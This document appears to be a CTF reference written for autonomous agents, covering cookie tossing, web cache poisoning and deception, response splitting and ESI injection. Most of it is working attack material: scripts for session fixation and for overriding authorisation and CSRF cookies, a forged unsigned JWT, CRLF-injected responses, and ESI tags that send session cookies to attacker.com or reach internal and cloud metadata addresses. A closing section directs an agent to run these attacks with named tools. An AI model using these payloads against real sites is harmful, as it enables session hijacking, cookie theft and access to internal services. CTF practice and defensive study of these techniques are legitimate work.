# Cookie Tossing and Cache-Based Attacks - CTF Reference

> **Document Purpose:** Actionable cookie tossing, cache poisoning, cache deception, response splitting, and ESI injection techniques for CTF challenges. Covers domain-scoped cookie attacks, cache key manipulation, unkeyed header exploitation, and edge-side include injection for autonomous agent retrieval.

---

## 1. Cookie Tossing Fundamentals

> **When to use this section:** You control a subdomain and want to inject or override cookies on the parent domain or sibling subdomains.

**Tags:** `cookie-tossing, cookies, subdomain, domain-scope, session-fixation`

**Concept:** Cookie tossing exploits the fact that a subdomain can set cookies scoped to the parent domain. If an attacker controls `evil.example.com`, they can set a cookie for `.example.com`, which the browser sends to `www.example.com` and all other subdomains.

**How Browsers Handle Domain-Scoped Cookies:**
```
Cookie set by evil.example.com:
  Set-Cookie: session=attacker_value; Domain=.example.com; Path=/

Browser sends this cookie to:
  www.example.com       -> YES (subdomain of .example.com)
  app.example.com       -> YES (subdomain of .example.com)
  api.example.com       -> YES (subdomain of .example.com)
  example.com           -> YES (parent domain)
  other-site.com        -> NO  (different domain)
```

**Setting Cookies from a Subdomain:**
```html
<!-- From evil.example.com -->
<script>
// Set cookie for parent domain
document.cookie = "session=attacker_token; domain=.example.com; path=/";

// Override existing cookie (browser sends both, server may use attacker's)
document.cookie = "admin=true; domain=.example.com; path=/";

// Set cookie with more specific path (takes precedence)
document.cookie = "session=evil; domain=.example.com; path=/admin";
</script>
```

**Cookie Priority Rules (When Multiple Cookies Have Same Name):**
```
1. More specific path wins (path=/admin beats path=/)
2. If same path: more specific domain wins (www.example.com beats .example.com)
3. If same path and domain: most recently set cookie appears first
4. Server receives ALL matching cookies: Cookie: session=evil; session=legitimate
5. Many frameworks use the FIRST value, so attacker's cookie takes precedence
```

---

## 2. Session Fixation via Cookie Tossing

> **When to use this section:** You can toss cookies from a subdomain and want to fix a victim's session to an attacker-controlled value.

**Tags:** `cookie-tossing, session-fixation, session-hijacking, subdomain-attack`

**Attack Flow:**
```
1. Attacker obtains a valid session token from the target application
2. Attacker controls evil.example.com (via XSS, subdomain takeover, etc.)
3. Attacker's page sets: document.cookie = "session=ATTACKER_SESSION; domain=.example.com"
4. Victim visits evil.example.com (via link, redirect, etc.)
5. Victim's browser now sends ATTACKER_SESSION to www.example.com
6. Victim logs in on www.example.com, binding their auth to ATTACKER_SESSION
7. Attacker uses ATTACKER_SESSION to access victim's authenticated session
```

**Exploitation Example:**
```html
<!-- evil.example.com/fixate.html -->
<html>
<body>
<script>
// Fix the victim's session to our known token
document.cookie = "session=abc123attacker; domain=.example.com; path=/; max-age=3600";

// Redirect victim to the legitimate login page
window.location = "https://www.example.com/login";
</script>
</body>
</html>
```

**Server-Side Impact:**
```python
# Many frameworks pick the first cookie value
# Flask example - request.cookies.get('session') returns the first one
@app.route('/dashboard')
def dashboard():
    session_id = request.cookies.get('session')  # Gets attacker's value
    user = lookup_session(session_id)             # Attacker's session
    return render_template('dashboard.html', user=user)
```

**Defenses to Check For:**
- Session regeneration after login (defeats fixation)
- Cookie `__Host-` prefix (cannot be set from subdomains)
- `SameSite=Strict` attribute (limits cross-site sending)

---

## 3. Cookie Tossing for Authentication Bypass

> **When to use this section:** The application uses cookie-based authorization checks that can be overridden from a subdomain.

**Tags:** `cookie-tossing, authentication-bypass, privilege-escalation, cookie-override`

**Overriding Authorization Cookies:**
```html
<script>
// If the app checks an "admin" cookie
document.cookie = "admin=true; domain=.example.com; path=/";

// If the app checks a "role" cookie
document.cookie = "role=administrator; domain=.example.com; path=/";

// JWT in cookie - replace with forged/none-algorithm JWT
document.cookie = "token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.; domain=.example.com; path=/";
</script>
```

**Path-Specific Cookie Override:**
```html
<script>
// Set a more specific path to take precedence on /admin routes
document.cookie = "session=forged_admin_session; domain=.example.com; path=/admin";
// This cookie is sent BEFORE the legitimate session cookie for /admin/* paths
</script>
```

**CSRF Token Override:**
```html
<script>
// Override CSRF token cookie to match a known value
document.cookie = "csrf_token=known_value; domain=.example.com; path=/";
// Now attacker can submit forms with csrf_token=known_value
</script>
```

---

## 4. Web Cache Poisoning

> **When to use this section:** The application uses a caching layer (CDN, Varnish, Nginx cache) and you want to poison cached responses.

### 4.1 Cache Poisoning via Unkeyed Headers

**Tags:** `cache-poisoning, unkeyed-headers, host-header, x-forwarded-host`

**Concept:** Caches store responses based on a "cache key" (usually URL + Host). If the application uses a header that is NOT part of the cache key to generate response content, an attacker can inject malicious content that gets cached and served to other users.

**Common Unkeyed Headers to Test:**
```http
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Forwarded-Proto: http
```

**Cache Poisoning via X-Forwarded-Host:**
```http
GET /page HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Host: attacker.com

Response:
HTTP/1.1 200 OK
...
<script src="https://attacker.com/static/main.js"></script>
```

- The cache key is `GET /page` on `vulnerable-site.com`
- The response includes `attacker.com` in script URLs due to `X-Forwarded-Host`
- This poisoned response is cached and served to all subsequent visitors
- The attacker hosts malicious JavaScript at `attacker.com/static/main.js`

### 4.2 Cache Poisoning via Host Header

**Tags:** `cache-poisoning, host-header, password-reset, link-injection`

```http
GET /reset-password HTTP/1.1
Host: attacker.com

Response:
HTTP/1.1 200 OK
...
<a href="https://attacker.com/reset?token=abc123">Reset Password</a>
```

**Password Reset Poisoning:**
```http
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

- If the app uses the Host header to generate reset links
- The victim receives an email with a link pointing to `attacker.com`
- Attacker captures the reset token when victim clicks the link

### 4.3 Cache Poisoning via Response Splitting

**Tags:** `cache-poisoning, response-splitting, crlf, header-injection`

```http
GET /redirect?url=http://target.com%0d%0aX-Injected:%20true%0d%0a%0d%0a<html>Poisoned</html> HTTP/1.1
Host: vulnerable-site.com
```

- If the `url` parameter is reflected in a `Location` header without sanitization
- CRLF (`%0d%0a`) terminates the header and starts a new response body
- The cache may store this crafted response for the URL

### 4.4 Fat GET Cache Poisoning

**Tags:** `cache-poisoning, fat-get, body-in-get, unkeyed-body`

```http
GET /api/data HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

callback=alert(1)//
```

- Some servers process GET request bodies (violating HTTP conventions)
- The body is not part of the cache key (only URL/Host are)
- If the response reflects the body parameter, the poisoned response is cached

---

## 5. Web Cache Deception

> **When to use this section:** You want to trick a cache into storing a victim's sensitive response and then retrieve it.

### 5.1 Path Confusion Cache Deception

**Tags:** `cache-deception, path-confusion, sensitive-data, static-extension`

**Concept:** Cache deception tricks the cache into storing dynamic, user-specific responses by appending static file extensions to dynamic URLs.

**Basic Cache Deception Attack:**
```
Legitimate URL:  https://target.com/account/profile
Attack URL:      https://target.com/account/profile/nonexistent.css
```

**Attack Flow:**
```
1. Attacker crafts URL: https://target.com/account/profile/anything.css
2. Attacker sends this URL to the victim (via email, chat, etc.)
3. Victim clicks the link while authenticated
4. Application ignores "/anything.css" and serves /account/profile (with victim's data)
5. Cache sees ".css" extension and caches the response as a static asset
6. Attacker requests the same URL and receives the victim's cached profile data
```

**Variations to Try:**
```
/account/profile/x.css
/account/profile/x.js
/account/profile/x.png
/account/profile/x.svg
/account/profile/..%2fx.css     (path traversal + extension)
/account/profile%2fx.css        (encoded slash)
/account/profile;x.css          (semicolon path parameter)
/account/profile%00x.css        (null byte)
```

### 5.2 Delimiter-Based Cache Deception

**Tags:** `cache-deception, delimiter, path-normalization, semicolon`

**Different Servers, Different Delimiters:**
```
Server          | Path delimiters recognized
----------------|---------------------------
Apache/Tomcat   | ; (semicolon as path parameter)
Ruby/Rails      | . (dot before format extension)
Spring          | ; (semicolon)
IIS             | ; (semicolon)
Nginx           | (generally strict, but configurable)
```

**Semicolon-Based Deception (Apache/Tomcat):**
```
https://target.com/account/profile;x.css

- Tomcat interprets: /account/profile (ignoring ;x.css as path param)
- Cache interprets: /account/profile;x.css (caches as .css)
```

**Dot-Based Deception (Rails):**
```
https://target.com/account/profile.json

- Rails may serve JSON version of profile (with sensitive data)
- Cache stores it as a "static" .json file
```

### 5.3 Detecting Cacheability

**Tags:** `cache-deception, detection, cache-headers, methodology`

**Cache Indicator Headers to Check:**
```http
X-Cache: HIT                    # Response served from cache
X-Cache: MISS                   # Response fetched from origin
X-Cache-Status: HIT
CF-Cache-Status: HIT            # Cloudflare
X-Varnish: 12345 67890          # Varnish (two IDs = cache hit)
Age: 300                        # Time in cache (seconds)
Cache-Control: public, max-age=3600
Via: 1.1 varnish (Varnish/6.0)
```

**Testing Methodology:**
```
1. Request /account/profile -> Note response (should be dynamic, personal)
2. Request /account/profile/x.css -> Check if same content returned
3. If same content: check X-Cache header
4. Send same URL from different session/IP
5. If you get the other user's data -> cache deception confirmed
```

---

## 6. Response Splitting Attacks

> **When to use this section:** User input is reflected in HTTP response headers and CRLF characters are not sanitized.

**Tags:** `response-splitting, crlf, header-injection, cache-poisoning`

**Basic Response Splitting:**
```http
GET /redirect?url=http://legit.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
Host: vulnerable-site.com
```

**Decoded Injection:**
```http
HTTP/1.1 302 Found
Location: http://legit.com
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 25

<script>alert(1)</script>
```

**What Happens:**
1. The first response is a valid 302 redirect with empty body
2. The second response is injected by the attacker
3. If connection is kept alive, the next request from any user receives the injected response
4. Combined with caching, this becomes persistent

**Testing for Response Splitting:**
```
# URL-encoded CRLF characters to inject
%0d%0a           -> \r\n (standard CRLF)
%0a              -> \n (LF only, works on some servers)
%0d              -> \r (CR only)
\r\n             -> literal (some parsers decode)
%E5%98%8A%E5%98%8D -> Unicode CRLF (UTF-8 encoded \u560a\u560d)
```

---

## 7. Edge Side Include (ESI) Injection

> **When to use this section:** The application uses an ESI-capable edge server (Varnish, Akamai, Fastly, Squid) and user input is reflected in responses processed by the edge.

### 7.1 ESI Fundamentals

**Tags:** `esi, edge-side-include, injection, varnish, akamai, cache`

**Concept:** ESI is an XML-based markup language processed by edge servers/CDNs. If user input is reflected in a response that is processed by an ESI engine, the attacker can include external content, access cookies, or perform SSRF.

**Basic ESI Tags:**
```xml
<!-- Include external content -->
<esi:include src="http://attacker.com/steal" />

<!-- Include with error handling -->
<esi:include src="http://attacker.com/" onerror="continue" />

<!-- Conditional inclusion -->
<esi:choose>
  <esi:when test="$(HTTP_COOKIE{admin})=='true'">
    <esi:include src="http://attacker.com/admin_detected" />
  </esi:when>
</esi:choose>

<!-- Variable access -->
<esi:vars>$(HTTP_COOKIE{session})</esi:vars>

<!-- Inline fragment -->
<esi:inline name="/fragment1" max-age="600">
  <p>This content is cached separately</p>
</esi:inline>
```

### 7.2 ESI Injection for SSRF

**Tags:** `esi, injection, ssrf, internal-access, server-side`

```xml
<!-- SSRF to internal services -->
<esi:include src="http://127.0.0.1:8080/admin" />
<esi:include src="http://169.254.169.254/latest/meta-data/" />
<esi:include src="http://internal-api.local/flag" />
```

**ESI processes on the edge server, which is often on the internal network, making SSRF attacks reach internal services.**

### 7.3 ESI Injection for Cookie Theft

**Tags:** `esi, injection, cookie-theft, exfiltration`

```xml
<!-- Exfiltrate cookies to attacker server -->
<esi:include src="http://attacker.com/steal?cookie=$(HTTP_COOKIE{session})" />

<!-- Access all cookies -->
<esi:vars>
$(HTTP_COOKIE)
</esi:vars>

<!-- Exfiltrate via image tag with ESI variable -->
<img src="http://attacker.com/log?c=<esi:vars>$(HTTP_COOKIE)</esi:vars>" />
```

### 7.4 ESI Detection

**Tags:** `esi, detection, headers, fingerprinting`

**Headers Indicating ESI Support:**
```http
Surrogate-Control: content="ESI/1.0"
X-ESI: 1
X-Varnish: 12345
Via: 1.1 varnish
Server: Varnish
X-CDN: Akamai
```

**Testing for ESI Processing:**
```xml
<!-- Test if ESI tags are processed -->
<esi:include src="http://UNIQUE_BURP_COLLABORATOR/" />

<!-- If you get a DNS/HTTP callback, ESI is being processed -->

<!-- Benign test (checks if tags are stripped vs rendered vs processed) -->
<esi:comment text="TEST_STRING" />
<!-- If TEST_STRING disappears from response: ESI is processed -->
<!-- If <esi:comment> appears in response: ESI is not processed -->
```

**ESI-Capable Products:**
```
Product             | ESI Support
--------------------|---------------------------
Varnish             | Partial (esi:include, esi:remove)
Akamai              | Full ESI support
Squid               | Partial (esi:include)
Fastly/Varnish      | esi:include with flags
IBM WebSphere       | Full ESI support
Oracle WebCache     | Full ESI support
F5 BIG-IP           | Partial ESI support
```

---

## 8. Advanced Cache Attack Techniques

> **When to use this section:** Basic cache poisoning/deception is not sufficient and you need more advanced techniques.

### 8.1 Cache Key Normalization Exploitation

**Tags:** `cache-poisoning, cache-key, normalization, encoding, parameter-cloaking`

**Parameter Cloaking:**
```
# Cache uses first parameter value, origin uses last
https://target.com/page?param=normal&param=<script>alert(1)</script>

# Cache key may normalize to ?param=normal
# Origin may use the last value: <script>alert(1)</script>
```

**URL Encoding Differences:**
```
# Cache may normalize URL encoding differently than origin
https://target.com/page%3Fparam=evil    # %3F = ?
https://target.com/page;param=evil       # semicolon delimiter
https://target.com/page?a=1%26b=evil    # %26 = &
```

### 8.2 Vary Header Exploitation

**Tags:** `cache-poisoning, vary-header, user-agent, accept-language`

```http
# If Vary: User-Agent, each User-Agent gets its own cache entry
# Poison specific User-Agent cache entries

GET /page HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)
X-Forwarded-Host: attacker.com

# This poisons the cache entry for Googlebot's User-Agent
# Useful for poisoning specific clients or crawlers
```

### 8.3 Cache Probing for Internal URLs

**Tags:** `cache-deception, cache-probing, internal-endpoints, discovery`

```
# Probe for cached internal endpoints
https://target.com/api/internal/config.json
https://target.com/admin/dashboard.css
https://target.com/debug/info.js
https://target.com/.well-known/openid-configuration

# Check Age header to see if response was already cached
# High Age value indicates the page is frequently cached
```

---

## 9. Common CTF Patterns

> **When to use this section:** Solving cookie tossing or cache attack challenges in CTF competitions.

**Tags:** `cookie-tossing, cache-poisoning, cache-deception, ctf, patterns`

**Pattern 1: Cookie Tossing Session Fixation**
```
Challenge: "Steal the admin's session"
Architecture: app.example.com + user-content.example.com
Step 1: XSS or subdomain control on user-content.example.com
Step 2: Toss session cookie: document.cookie = "session=KNOWN; domain=.example.com"
Step 3: Trick admin into visiting user-content.example.com
Step 4: Admin's session on app.example.com is now KNOWN
Step 5: Use KNOWN session to access admin features
```

**Pattern 2: Cache Poisoning XSS**
```
Challenge: "Get XSS on the main page"
Architecture: CDN/Cache -> App server
Step 1: Identify unkeyed header (X-Forwarded-Host)
Step 2: Send: GET / with X-Forwarded-Host: attacker.com
Step 3: Response includes <script src="https://attacker.com/js/app.js">
Step 4: Response is cached, all users load attacker's JS
Step 5: Host payload at attacker.com/js/app.js to steal cookies/flag
```

**Pattern 3: Cache Deception Data Theft**
```
Challenge: "Read the admin's profile"
Architecture: Nginx cache -> Flask app
Step 1: Confirm /profile returns user-specific data
Step 2: Send admin link: https://target.com/profile/x.css
Step 3: Admin clicks link, their profile is cached as static .css
Step 4: Request https://target.com/profile/x.css from your browser
Step 5: Receive admin's cached profile data with flag
```

**Pattern 4: ESI Injection SSRF**
```
Challenge: "Access the internal admin service"
Architecture: Varnish -> App server, internal admin on 127.0.0.1:8080
Step 1: Find reflection point in response processed by Varnish
Step 2: Inject: <esi:include src="http://127.0.0.1:8080/flag" />
Step 3: Varnish processes ESI tag, fetches internal admin page
Step 4: Flag appears in the response body
```

**Pattern 5: Response Splitting Cache Poisoning**
```
Challenge: "Poison the login page"
Architecture: Caching proxy with keep-alive
Step 1: Find CRLF injection in redirect parameter
Step 2: Inject second response with malicious HTML
Step 3: Second response gets cached for the next request's URL
Step 4: Subsequent visitors to /login see attacker's page
```

**CTF Playbook:**
1. Check for caching: look for `X-Cache`, `Age`, `Via`, `CF-Cache-Status` headers
2. Identify cache key: test if query params, headers, cookies affect caching
3. For cache poisoning: find unkeyed inputs reflected in response (`X-Forwarded-Host`, `X-Original-URL`)
4. For cache deception: append static extensions (`.css`, `.js`, `.png`) to dynamic URLs
5. For cookie tossing: check if you control any subdomain (XSS, takeover)
6. For ESI: check `Surrogate-Control` header and test `<esi:include>` tags
7. For response splitting: test CRLF (`%0d%0a`) in all reflected header values
8. Always verify with two requests: poison first, then fetch from different session to confirm

---

## 10. Agent Takeaway

> - Use `http_fetch` with custom headers (`X-Forwarded-Host`, etc.) to test cache poisoning vectors
> - Use `cookie_set` to set domain-scoped cookies for cookie tossing attacks
> - Use `crlf_probe` tool to detect response splitting / CRLF injection vulnerabilities
> - Use `html_inspector` to check for ESI tags in responses and `Surrogate-Control` headers
> - Cache poisoning requires identifying unkeyed headers: systematically test `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`
> - Cache deception targets authenticated victims: craft URLs with static extensions appended to dynamic endpoints
> - Cookie tossing requires subdomain control: check for XSS on any subdomain or subdomain takeover opportunities
> - ESI injection is powerful but requires an ESI-capable edge server: look for Varnish, Akamai, Squid indicators
> - Always check `X-Cache` and `Age` response headers to confirm caching behavior
> - Response splitting via CRLF is a classic technique; even partial header injection can enable cache poisoning
> - For CTF challenges, cache deception with `.css`/`.js` appended to profile URLs is the most common pattern
> - Cookie tossing attacks are often combined with session fixation for a complete exploit chain
